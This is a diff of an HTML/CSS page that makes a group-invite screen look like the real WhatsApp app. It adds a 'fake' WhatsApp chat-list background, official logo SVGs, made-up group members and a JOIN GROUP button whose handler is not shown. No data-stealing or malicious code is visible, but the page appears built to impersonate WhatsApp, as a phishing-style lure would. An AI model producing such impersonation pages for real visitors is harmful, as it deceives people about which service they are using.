@@ -16,255 +16,279 @@
         background: #111b21;
         min-height: 100vh;
         display: flex;
-        align-items: center;
+        align-items: flex-end;
         justify-content: center;
-        padding: 20px;
+        overflow: hidden;
     }
 
-    /* Background dim effect */
-    .bg-dim {
+    /* Fake WhatsApp background chat screen */
+    .fake-bg {
         position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.75);
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: #111b21;
+        z-index: 0;
+        display: flex;
+        flex-direction: column;
+    }
+
+    /* Top bar like WhatsApp */
+    .wa-topbar {
+        background: #1f2c33;
+        padding: 10px 16px 8px 16px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        border-bottom: 0.5px solid rgba(255,255,255,0.07);
+        flex-shrink: 0;
+    }
+
+    .wa-topbar-left {
+        display: flex;
+        align-items: center;
+        gap: 9px;
+    }
+
+    .wa-topbar-logo {
+        font-size: 21px;
+        font-weight: 700;
+        color: #e9edef;
+        letter-spacing: -0.3px;
+    }
+
+    .wa-topbar-icons {
+        margin-left: auto;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        color: #aebac1;
+    }
+
+    .wa-topbar-icons .icon-btn {
+        width: 36px; height: 36px;
+        border-radius: 50%;
+        display: flex; align-items: center; justify-content: center;
+        cursor: pointer;
+        transition: background 0.15s;
+    }
+    .wa-topbar-icons .icon-btn:hover { background: rgba(255,255,255,0.08); }
+    .wa-topbar-icons svg { width: 22px; height: 22px; fill: #aebac1; }
+
+    /* Search bar */
+    .wa-search {
+        background: #1f2c33;
+        padding: 6px 16px 10px 16px;
+        flex-shrink: 0;
+    }
+    .wa-search-inner {
+        background: #2a3942;
+        border-radius: 10px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 8px 14px;
+    }
+    .wa-search-inner svg { width: 18px; height: 18px; fill: #8696a0; flex-shrink: 0; }
+    .wa-search-inner span { font-size: 15px; color: #8696a0; }
+
+    /* Chat list background */
+    .chat-list-bg {
+        flex: 1;
+        overflow: hidden;
+        position: relative;
+    }
+
+    .chat-list-bg::after {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.65);
         z-index: 1;
     }
 
-    /* WhatsApp Modal Container */
-    .whatsapp-modal {
-        width: 100%;
-        max-width: 380px;
-        background: #1e2a3a;
-        border-radius: 28px;
-        overflow: hidden;
-        position: relative;
-        z-index: 2;
-        animation: slideUp 0.3s ease-out;
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-    }
-
-    @keyframes slideUp {
-        from {
-            opacity: 0;
-            transform: translateY(50px);
-        }
-        to {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    }
-
-    /* WhatsApp Logo in Header */
-    .whatsapp-logo-bar {
-        padding: 16px 20px;
-        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
+    .chat-item {
         display: flex;
         align-items: center;
-        gap: 8px;
+        gap: 14px;
+        padding: 12px 16px;
+        border-bottom: 0.5px solid rgba(255,255,255,0.05);
     }
 
-    .wa-logo {
-        width: 28px;
-        height: 28px;
-        background: #25D366;
+    .chat-avatar {
+        width: 48px; height: 48px;
         border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 16px;
-    }
-
-    .wa-text {
-        font-size: 14px;
-        font-weight: 500;
-        color: #e9edef;
-    }
-
-    /* Header */
-    .modal-header {
-        padding: 24px 20px 16px 20px;
-        text-align: center;
-        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .group-icon {
-        width: 64px;
-        height: 64px;
-        background: linear-gradient(135deg, #1e8e7a 0%, #0a6b5c 100%);
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 12px auto;
-        font-size: 32px;
-        box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-    }
-
-    .group-name {
+        background: #2a3942;
+        display: flex; align-items: center; justify-content: center;
         font-size: 22px;
-        font-weight: 600;
-        color: #e9edef;
-        margin-bottom: 4px;
+        flex-shrink: 0;
     }
 
-    .group-details {
-        font-size: 13px;
-        color: #8696a0;
-        margin-bottom: 8px;
+    .chat-info { flex: 1; }
+    .chat-name { font-size: 15px; color: #e9edef; font-weight: 500; }
+    .chat-msg { font-size: 13px; color: #8696a0; margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 220px; }
+    .chat-time { font-size: 11px; color: #8696a0; }
+
+    /* Overlay dim */
+    .overlay {
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.65);
+        z-index: 10;
     }
 
-    /* Info Section */
-    .info-section {
-        padding: 12px 20px;
-        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .info-row {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        padding: 10px 0;
-        cursor: pointer;
-        transition: background 0.2s;
-    }
-
-    .info-row:hover {
-        background: rgba(255, 255, 255, 0.05);
-        margin: 0 -20px;
-        padding: 10px 20px;
-    }
-
-    .info-icon {
-        width: 24px;
-        font-size: 18px;
-        color: #8696a0;
-    }
-
-    .info-text {
-        flex: 1;
-        font-size: 15px;
-        color: #e9edef;
-    }
-
-    .info-text small {
-        font-size: 13px;
-        color: #8696a0;
-        display: block;
-        margin-top: 2px;
-    }
-
-    .chevron {
-        color: #8696a0;
-        font-size: 14px;
-    }
-
-    /* Members Section */
-    .members-section {
-        padding: 12px 20px;
-        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .section-title {
-        font-size: 13px;
-        font-weight: 600;
-        color: #8696a0;
-        letter-spacing: 0.5px;
-        margin-bottom: 12px;
-    }
-
-    .member-list {
+    /* ====== BOTTOM SHEET — REAL WHATSAPP STYLE ====== */
+    .bottom-sheet {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        z-index: 20;
+        background: #1f2c33;
+        border-radius: 28px 28px 0 0;
+        max-height: 55vh;
+        min-height: 42vh;
         display: flex;
         flex-direction: column;
-        gap: 14px;
+        animation: sheetUp 0.35s cubic-bezier(0.32,0.72,0,1);
+        box-shadow: 0 -4px 32px rgba(0,0,0,0.45);
+        overflow: hidden;
     }
 
-    .member-item {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        padding: 4px 0;
+    @keyframes sheetUp {
+        from { transform: translateY(100%); }
+        to { transform: translateY(0); }
     }
 
-    .member-avatar {
-        width: 44px;
-        height: 44px;
-        background: #2a3942;
-        border-radius: 50%;
+    /* Drag handle */
+    .drag-handle {
+        width: 36px; height: 4px;
+        background: rgba(255,255,255,0.2);
+        border-radius: 2px;
+        margin: 10px auto 0 auto;
+        flex-shrink: 0;
+    }
+
+    /* WhatsApp Logo Row */
+    .wa-brand-row {
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 20px;
-        color: #e9edef;
+        gap: 7px;
+        padding: 10px 0 4px 0;
+        flex-shrink: 0;
     }
 
-    .member-info {
-        flex: 1;
+    .wa-brand-icon {
+        width: 22px; height: 22px;
+        flex-shrink: 0;
     }
 
-    .member-name {
-        font-size: 15px;
-        font-weight: 500;
-        color: #e9edef;
-        margin-bottom: 2px;
-    }
-
-    .member-status {
-        font-size: 12px;
-        color: #8696a0;
-    }
-
-    .admin-badge {
-        background: rgba(0, 168, 132, 0.2);
-        padding: 2px 8px;
-        border-radius: 12px;
-        font-size: 10px;
-        color: #00a884;
+    .wa-brand-text {
+        font-size: 14px;
         font-weight: 600;
-        margin-left: 8px;
+        color: #aebac1;
+        letter-spacing: 0.2px;
     }
 
-    /* Created By */
-    .created-by {
-        padding: 14px 20px;
-        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
+    /* Group icon area */
+    .group-hero {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 8px 20px 4px 20px;
+        flex-shrink: 0;
     }
 
-    .created-text {
+    .group-icon-circle {
+        width: 62px; height: 62px;
+        background: linear-gradient(145deg, #00a884 0%, #007a63 100%);
+        border-radius: 50%;
+        display: flex; align-items: center; justify-content: center;
+        margin-bottom: 10px;
+        box-shadow: 0 2px 12px rgba(0,168,132,0.3);
+        flex-shrink: 0;
+    }
+
+    .group-icon-circle svg {
+        width: 36px; height: 36px;
+        fill: white;
+    }
+
+    .group-name-text {
+        font-size: 20px;
+        font-weight: 700;
+        color: #e9edef;
+        margin-bottom: 3px;
+        text-align: center;
+    }
+
+    .group-meta {
         font-size: 13px;
         color: #8696a0;
         text-align: center;
     }
 
-    /* Join Group Button */
-    .join-button-container {
-        padding: 20px;
+    /* Member avatars row */
+    .member-row {
+        display: flex;
+        justify-content: center;
+        gap: -8px;
+        padding: 10px 20px 0 20px;
+        flex-shrink: 0;
     }
 
+    .member-avatar-small {
+        width: 38px; height: 38px;
+        border-radius: 50%;
+        border: 2px solid #1f2c33;
+        background: #2a3942;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 18px;
+        margin-left: -6px;
+        flex-shrink: 0;
+    }
+
+    .member-avatar-small:first-child { margin-left: 0; }
+
+    /* Spacer */
+    .sheet-spacer { flex: 1; }
+
+    /* Bottom area */
+    .sheet-bottom {
+        padding: 0 20px 32px 20px;
+        flex-shrink: 0;
+    }
+
+    /* Created by */
+    .created-line {
+        text-align: center;
+        font-size: 12px;
+        color: #8696a0;
+        margin-bottom: 14px;
+        padding-top: 8px;
+    }
+
+    /* JOIN GROUP button */
     .join-btn {
         width: 100%;
         background: #00a884;
         color: white;
         border: none;
-        padding: 14px;
+        padding: 15px;
         border-radius: 28px;
-        font-size: 16px;
-        font-weight: 600;
+        font-size: 15px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
         cursor: pointer;
         transition: all 0.2s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
     }
 
-    .join-btn:hover {
-        background: #008069;
-        transform: scale(1.01);
-    }
-
-    .join-btn:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-        transform: none;
-    }
+    .join-btn:hover { background: #008069; transform: scale(1.01); }
+    .join-btn:active { transform: scale(0.99); }
+    .join-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
     /* Toast Message */
     .toast-message {
@@ -280,30 +304,20 @@
         z-index: 1000;
         animation: fadeInUp 0.3s ease;
         box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        white-space: nowrap;
     }
 
     @keyframes fadeInUp {
-        from {
-            opacity: 0;
-            transform: translateX(-50%) translateY(20px);
-        }
-        to {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
+        from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        to { opacity: 1; transform: translateX(-50%) translateY(0); }
     }
 
     /* Success Modal */
     .success-modal {
         position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
+        top: 0; left: 0; width: 100%; height: 100%;
         background: rgba(0,0,0,0.85);
-        display: flex;
-        align-items: center;
-        justify-content: center;
+        display: flex; align-items: center; justify-content: center;
         z-index: 2000;
         animation: fadeIn 0.3s ease;
     }
@@ -315,152 +329,145 @@
         border-radius: 32px;
         text-align: center;
         max-width: 280px;
-        animation: slideUp 0.3s ease;
+        animation: sheetUp 0.3s ease;
     }
 
-    .success-icon {
-        font-size: 56px;
-        margin-bottom: 16px;
-    }
-
-    .success-content h3 {
-        font-size: 20px;
-        color: #e9edef;
-        margin-bottom: 8px;
-    }
-
-    .success-content p {
-        font-size: 14px;
-        color: #8696a0;
-        margin-bottom: 24px;
-    }
-
+    .success-icon { font-size: 56px; margin-bottom: 16px; }
+    .success-content h3 { font-size: 20px; color: #e9edef; margin-bottom: 8px; }
+    .success-content p { font-size: 14px; color: #8696a0; margin-bottom: 24px; }
     .success-content button {
-        background: #00a884;
-        color: white;
-        border: none;
-        padding: 12px 24px;
-        border-radius: 28px;
-        font-size: 14px;
-        font-weight: 600;
-        cursor: pointer;
-        width: 100%;
+        background: #00a884; color: white; border: none;
+        padding: 12px 24px; border-radius: 28px;
+        font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;
     }
 
-    @keyframes fadeIn {
-        from { opacity: 0; }
-        to { opacity: 1; }
-    }
-
-    /* Footer */
-    .footer-note {
-        padding: 12px 20px;
-        text-align: center;
-        border-top: 0.5px solid rgba(255, 255, 255, 0.05);
-    }
-
-    .footer-note p {
-        font-size: 10px;
-        color: #8696a0;
-    }
-
-    .footer-note strong {
-        color: #00a884;
-    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 </style>
 </head>
 <body>
-    <div class="bg-dim"></div>
-    <div class="whatsapp-modal">
-        <!-- WhatsApp Logo Bar -->
-        <div class="whatsapp-logo-bar">
-            <div class="wa-logo">💚</div>
-            <div class="wa-text">WhatsApp</div>
-        </div>
 
-        <!-- Header -->
-        <div class="modal-header">
-            <div class="group-icon">👥</div>
-            <div class="group-name">Friends</div>
-            <div class="group-details">5 members, 5 contacts • Created by You, today</div>
+<!-- Fake WhatsApp background -->
+<div class="fake-bg">
+    <div class="wa-topbar">
+        <div class="wa-topbar-left">
+            <!-- WhatsApp green logo -->
+            <svg width="30" height="30" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#25D366"/>
+                <path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/>
+            </svg>
+            <div class="wa-topbar-logo">WhatsApp</div>
         </div>
-
-        <!-- Info Section -->
-        <div class="info-section">
-            <div class="info-row">
-                <div class="info-icon">🔔</div>
-                <div class="info-text">Mute notifications</div>
-                <div class="chevron">›</div>
+        <div class="wa-topbar-icons">
+            <!-- Rupee icon -->
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 9h4l-4.5 5H16l-4 5-1.5-1.5 2.8-3.5H9l1-1.5h3.5L15 11h-2zm-3-5h9v2H10zm0 4h9v2H10z"/></svg>
             </div>
-            <div class="info-row">
-                <div class="info-icon">🏷️</div>
-                <div class="info-text">
-                    Group description
-                    <small>No description provided</small>
-                </div>
-                <div class="chevron">›</div>
+            <!-- Camera icon -->
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 15.2A3.2 3.2 0 1 1 15.2 12 3.2 3.2 0 0 1 12 15.2m7.2-10.4h-2.5l-1.6-2H8.9L7.3 4.8H4.8A2.4 2.4 0 0 0 2.4 7.2v12a2.4 2.4 0 0 0 2.4 2.4h14.4a2.4 2.4 0 0 0 2.4-2.4v-12a2.4 2.4 0 0 0-2.4-2.4z"/></svg>
             </div>
-        </div>
-
-        <!-- Members Section -->
-        <div class="members-section">
-            <div class="section-title">MEMBERS • 5</div>
-            <div class="member-list">
-                <div class="member-item">
-                    <div class="member-avatar">👤</div>
-                    <div class="member-info">
-                        <div class="member-name">You <span class="admin-badge">Admin</span></div>
-                        <div class="member-status">Online</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👨</div>
-                    <div class="member-info">
-                        <div class="member-name">Rahul Sharma</div>
-                        <div class="member-status">Online</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👩</div>
-                    <div class="member-info">
-                        <div class="member-name">Priya Verma</div>
-                        <div class="member-status">Typing...</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👨‍💻</div>
-                    <div class="member-info">
-                        <div class="member-name">Amit Kumar</div>
-                        <div class="member-status">Online</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👩‍💼</div>
-                    <div class="member-info">
-                        <div class="member-name">Neha Gupta</div>
-                        <div class="member-status">Last seen recently</div>
-                    </div>
-                </div>
+            <!-- Three dots -->
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
             </div>
-        </div>
-
-        <!-- Created By -->
-        <div class="created-by">
-            <div class="created-text">Created by You • today</div>
-        </div>
-
-        <!-- Join Group Button -->
-        <div class="join-button-container">
-            <button id="joinBtn" class="join-btn" onclick="joinGroup()">
-                JOIN GROUP
-            </button>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer-note">
-            <p>💚 <strong>WhatsApp</strong> • End-to-end encrypted</p>
         </div>
     </div>
+    <!-- Search bar -->
+    <div class="wa-search">
+        <div class="wa-search-inner">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <span>Ask Meta AI or Search</span>
+        </div>
+    </div>
+    <div class="chat-list-bg">
+        <div class="chat-item">
+            <div class="chat-avatar">👥</div>
+            <div class="chat-info">
+                <div class="chat-name">Friends</div>
+                <div class="chat-msg">You joined using this group's invite link</div>
+            </div>
+            <div class="chat-time">3:31 PM</div>
+        </div>
+        <div class="chat-item">
+            <div class="chat-avatar">👤</div>
+            <div class="chat-info">
+                <div class="chat-name">Rahul Sharma</div>
+                <div class="chat-msg">Hey, check this out!</div>
+            </div>
+            <div class="chat-time">2:44 PM</div>
+        </div>
+        <div class="chat-item">
+            <div class="chat-avatar">👩</div>
+            <div class="chat-info">
+                <div class="chat-name">Priya Verma</div>
+                <div class="chat-msg">Okay sure, I'll be there</div>
+            </div>
+            <div class="chat-time">2:32 PM</div>
+        </div>
+        <div class="chat-item">
+            <div class="chat-avatar">👨‍💻</div>
+            <div class="chat-info">
+                <div class="chat-name">Amit Kumar</div>
+                <div class="chat-msg">👍 Sounds good!</div>
+            </div>
+            <div class="chat-time">1:10 PM</div>
+        </div>
+    </div>
+</div>
+
+<!-- Overlay -->
+<div class="overlay"></div>
+
+<!-- ===== WHATSAPP BOTTOM SHEET ===== -->
+<div class="bottom-sheet">
+    <!-- Drag handle -->
+    <div class="drag-handle"></div>
+
+    <!-- WhatsApp branding -->
+    <div class="wa-brand-row">
+        <!-- Official WhatsApp SVG Logo -->
+        <svg class="wa-brand-icon" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="16" cy="16" r="16" fill="#25D366"/>
+            <path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/>
+        </svg>
+        <div class="wa-brand-text">WhatsApp</div>
+    </div>
+
+    <!-- Group icon + name -->
+    <div class="group-hero">
+        <div class="group-icon-circle">
+            <!-- Group icon SVG -->
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
+            </svg>
+        </div>
+        <div class="group-name-text">Friends</div>
+        <div class="group-meta">5 members, 5 contacts • Created by You, today</div>
+    </div>
+
+    <!-- Member avatars -->
+    <div class="member-row">
+        <div class="member-avatar-small">👤</div>
+        <div class="member-avatar-small">👨</div>
+        <div class="member-avatar-small">👩</div>
+        <div class="member-avatar-small">👨‍💻</div>
+        <div class="member-avatar-small">👩‍💼</div>
+    </div>
+
+    <div class="sheet-spacer"></div>
+
+    <!-- Bottom: created by + button -->
+    <div class="sheet-bottom">
+        <div class="created-line">Created by You • today</div>
+        <button id="joinBtn" class="join-btn" onclick="joinGroup()">
+            <!-- WhatsApp icon small -->
+            <svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/>
+            </svg>
+            JOIN GROUP
+        </button>
+    </div>
+</div>
 
 <script>
 function joinGroup() {
@@ -567,7 +574,7 @@ function showSuccessModal() {
 function resetButton() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = false;
-    btn.textContent = "JOIN GROUP";
+    btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/></svg> JOIN GROUP`;
 }
 </script>
 </body>
